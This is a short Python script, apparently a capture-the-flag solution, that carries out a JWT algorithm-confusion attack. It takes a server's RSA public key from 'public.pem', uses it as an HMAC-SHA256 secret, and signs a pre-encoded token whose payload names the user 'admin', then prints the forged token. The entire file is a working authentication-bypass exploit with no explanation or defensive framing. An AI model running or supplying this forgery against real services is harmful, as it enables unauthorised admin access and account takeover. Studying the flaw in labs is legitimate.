import hmac
import hashlib
import base64

with open('public.pem','r') as f:
	w = f.read()

header = {
  "typ": "JWT",
  "alg": "HS256"
}
payload = {"login":"HS256"}
token_no_encode = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6ImFkbWluIn0'

dig = hmac.new(bytes(w,'utf-8'), msg=bytes(token_no_encode,'utf-8'), digestmod=hashlib.sha256).digest()
s = base64.b64encode(dig).decode()
s = s.replace('+','-')
s = s.replace('/','_')
print(token_no_encode + "." + s)
